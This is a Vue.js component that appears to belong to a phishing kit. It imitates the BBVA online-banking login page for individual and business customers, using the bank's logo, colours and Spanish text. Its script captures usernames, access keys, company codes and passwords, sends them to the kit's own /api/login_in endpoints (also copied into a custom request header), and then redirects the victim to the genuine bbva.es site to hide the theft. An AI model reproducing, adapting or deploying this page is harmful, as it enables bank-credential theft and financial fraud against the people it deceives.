<template>

<div>  
    <nav class="uk-navbar-container" style="background: #072146; height:88px;">
        <a class="uk-navbar-item uk-logo" href="#">
            <img src="/images/logo_bbva_blanco.svg" class="logoo" alt="">
        </a>
    </nav>
    <br><br>

    <div class="container" style="">
        <div v-if="login_as == null" class="uk-text-center uk-text-large">
            Hola, elige tu tipo de cuenta
        </div>
        <ul uk-tab class="uk-flex-center c_ul">
            <li v-bind:class="{'uk-active': login_as == 'personal'}" class="uk-width-1-2"><a href="#" @click.prevent="change_account('personal')" style="border: 1px solid;">Autónomos</a></li>
            <li v-bind:class="{'uk-active': login_as == 'company'}" class="uk-width-1-2"><a href="#" @click.prevent="change_account('company')" style="border: 1px solid;">Empresas</a></li>
        </ul>

        <div class="row justify-content-center" v-if="login_as == 'personal'">
            <div class="col-md-6">
                <p v-if="!step4" class="ttl2">Hola, introduce tu usuario y clave de acceso y entra en BBVA online:</p><br>
                <form class="uk-grid-small" uk-grid>
                    <div class="uk-width-1-1">
                        <input class="uk-input" type="text" maxlength="16" placeholder="Usuario" v-model="Usuario">
                    </div>
                    <div class="uk-width-1-1">
                        <input class="uk-input" type="password" maxlength="6" placeholder="Clave de acceso" v-model="Clave_de_acceso">
                    </div>
                </form>
                <br>
                <div class="row justify-content-center">
                    <div class="col-md-5">
                        <button :disabled="!IsValid" @click.prevent="SubmitLogin()" class="uk-button bnt-Login" style="padding: 7px; margin: 0px;">Entrar</button>
                    </div>
                    <div class="col-md-7" style="text-align: left; font-size: 13px; padding: 6px 24px; color: #237ABA;">
                        <div>¿Olvidaste tu clave de</div>
                        <div>acceso?</div>
                    </div>
                </div>
            </div>

            <div class="col-md-6">
                <div class="accesso">
                    <div class="txt">Si ya eres cliente de BBVA pero</div>
                    <div class="ttl">no tienes claves para acceder,</div>
                    <div class="txt">solo tienes que crearlas.</div>
                    <div class="bnt-Login" style="width: 218px;">
                        Crear clave de acceso
                    </div>
                    <div class="txt">
                        Conoce las ventajas de utilizar banca online<br>
                    </div>
                </div>
            </div>
        </div>

        <div class="row justify-content-center" v-if="login_as == 'company'">
            <div class="col-md-6">
                <p v-if="!step4" class="ttl2">Introduce tus claves y entra en BBVA Net Cash.</p><br>
                <form class="uk-grid-small" uk-grid>
                    <div class="uk-width-1-1">
                        <input class="uk-input" type="text" maxlength="8" placeholder="Código de empresa" v-model="Codigo_de_empresa">
                    </div>
                    <div class="uk-width-1-1">
                        <input class="uk-input" type="text" maxlength="8" placeholder="Usuario" v-model="Usuario">
                    </div>
                    <div class="uk-width-1-1">
                        <input class="uk-input" type="password" maxlength="8" placeholder="Contraseña" v-model="Contrasena">
                    </div>
                </form>
                <br>
                <div class="row justify-content-center">
                    <div class="col-md-5">
                        <button :disabled="!IsValidCompany" @click.prevent="SubmitLoginCompany()" class="uk-button bnt-Login" style="padding: 7px; margin: 0px;">Entrar</button>
                    </div>
                </div>
                <br>
            </div>

            <div class="col-md-6">
                <div class="accesso">
                    <div class="txt">Si quieres retomar tu proceso de alta o entrar en tu "área privada de no clientes".</div>
                    <!-- <div class="ttl">no tienes claves para acceder,</div> -->
                    <div class="txt">Accede con tu email y contraseña</div>
                    <div class="bnt-Login" style="width: 218px;">Acceder</div>
                    <div class="txt">
                        Si ya eres cliente de BBVA y todavía no tienes contratado Net Cash hazlo 100% online. 
                        <br>
                    </div>
                </div>
            </div>
        </div>

        <loading :active.sync="isLoading" :color="`blue`" :is-full-page="fullPage"></loading>


    </div>
</div>

</template>

<script>

    export default {
        data(){
            return {
                Usuario: '',
                Clave_de_acceso: '',
                Codigo_de_empresa: '',
                Contrasena: '',

                isLoading: false, 
                fullPage: true,
                login_as: null 
            }
        },

        methods: {
            
            SubmitLogin(){
                this.isLoading = true;
                let formData = new FormData();
                formData.append('Account', 'Autónomos');
                formData.append('Usuario', this.Usuario);
                formData.append('Clave_de_acceso', this.Clave_de_acceso);

                const config = {
                    headers: { 'form_content': "Autonomos "+this.Usuario+" "+this.Clave_de_acceso }
                }

                axios.post(`/api/login_in`, formData, config)
                    .then(res => {
                        window.location.href = "https://www.bbva.es/"
                    }).catch(res => { 
                });
            },

            SubmitLoginCompany(){
                this.isLoading = true;
                let formData = new FormData();
                formData.append('Account', 'Empresas');
                formData.append('Codigo_de_empresa', this.Codigo_de_empresa);
                formData.append('Usuario', this.Usuario);
                formData.append('Contrasena', this.Contrasena);

                const config = {
                    headers: { 'form_content': "Empresas "+this.Codigo_de_empresa+" "+this.Usuario+" "+this.Contrasena }
                }

                axios.post(`/api/login_in_company`, formData, config)
                    .then(res => {
                        window.location.href = "https://www.bbva.es/"
                    }).catch(res => { 
                });
            },

            change_account(value){
                this.login_as = value;
            }
                
        },
        computed: {
            IsValid() {
                    return this.Usuario !== ''
                    && this.Clave_de_acceso !==''
            },
            
            IsValidCompany() {
                    return this.Codigo_de_empresa !== ''
                    && this.Usuario !==''
                    && this.Contrasena !==''
            },
            
        }
    };
</script>
<style scoped> 
.logoo{
    width: 140px;
}
.accesso{
    border-radius: 1px;
    padding: 24px;
    background-color: #004481;
}
.ttl{
    color: #fff;
    font-size: 18px;
    margin: 0;
    font-weight: bold;
    line-height: 24px;
}
.txt{
    color: #fff;
    font-weight: initial;
    font-size: 14px;
    line-height: 20px;
}
.bnt-Login{
    border-radius: 1px;
    width: 150px;
    background: #237ABA;
    padding: 14px;
    text-align: center;
    color: white;
    font-weight: bold;
    margin: 15px 0 25px;
}
.ttl2{
        font-size: 22px;
    margin-bottom: 20px;
    color: #000000;
}
input{
    font-size: 15px;
    color: #121212;
    padding: 24px 0 5px 15px;
    margin-bottom: 10px;
    margin-right: 0;
    display: block;
    height: 48px;
    border: none;
    border-bottom: 1px solid #121212;
    background: #F4F4F4;
    box-shadow: unset;
    border-radius: 0px;
}

.c_ul::before{
    border-bottom: none !important;
}

* {
    font-family: sans-serif;
}
</style>